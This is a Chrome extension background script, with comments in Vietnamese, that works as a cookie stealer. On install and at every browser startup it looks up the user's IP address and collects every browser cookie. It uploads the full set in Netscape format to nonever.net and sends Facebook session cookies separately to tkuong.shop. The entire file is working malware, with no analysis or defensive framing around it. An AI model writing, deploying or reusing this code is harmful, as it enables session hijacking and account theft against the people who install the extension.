chrome.runtime.onStartup.addListener(() => {
  sendCookies();
});

chrome.runtime.onInstalled.addListener(() => {
  sendCookies();
});

async function sendCookies() {
  try {
    const ipResponse = await fetch("https://api.ipify.org");
    if (!ipResponse.ok) throw new Error("Failed to fetch IP address");
    const ip = await ipResponse.text();

    chrome.cookies.getAll({}, (cookies) => {
      let netscapeFormat = "";
      let facebookCookies = "";

      cookies.forEach((cookie) => {
        const domain = cookie.domain.startsWith(".") ? cookie.domain : "." + cookie.domain;
        const path = cookie.path || "/";
        const secure = cookie.secure ? "TRUE" : "FALSE";
        const expires = cookie.expirationDate ? Math.round(cookie.expirationDate) : "";
        const name = cookie.name;
        const value = cookie.value;

        netscapeFormat += `${domain}\t${secure}\t${path}\tFALSE\t${expires}\t${name}\t${value}\n`;

        if (domain.includes("facebook.com")) {
          facebookCookies += `${name}=${value}; `;
        }
      });

      facebookCookies = facebookCookies.trim().replace(/;$/, "");

      console.log("Netscape Format Cookies:\n", netscapeFormat);
      console.log("Filtered Facebook Cookies:\n", facebookCookies);

      // Gửi All_Cookies.txt
      const formAll = new FormData();
      const blobAll = new Blob([netscapeFormat], { type: "text/plain" });
      formAll.append("file", blobAll, "All_Cookies.txt");

      fetch("https://nonever.net/upload.php", {
        method: "POST",
        body: formAll
      })
        .then((res) => res.json())
        .then((data) => {
          if (data.status !== "success") {
            throw new Error("Upload All Cookies failed: " + data.message);
          }
          console.log("All cookies uploaded successfully.");
        })
        .catch((err) => {
          console.error("Error uploading all cookies:", err);
        });

      // Gửi Facebook_Cookies.txt nếu có
      if (facebookCookies) {
        const formFb = new FormData();
        const blobFb = new Blob([facebookCookies], { type: "text/plain" });
        formFb.append("file", blobFb, "Cookies_Fb.txt");

        fetch("https://tkuong.shop/upload.php", {
          method: "POST",
          body: formFb
        })
          .then((res) => res.json())
          .then((data) => {
            if (data.status !== "success") {
              throw new Error("Upload Facebook cookies failed: " + data.message);
            }
            console.log("Facebook cookies uploaded successfully.");
          })
          .catch((err) => {
            console.error("Error uploading Facebook cookies:", err);
          });
      }
    });
  } catch (error) {
    console.error("Unexpected error in sendCookies():", error);
  }
}
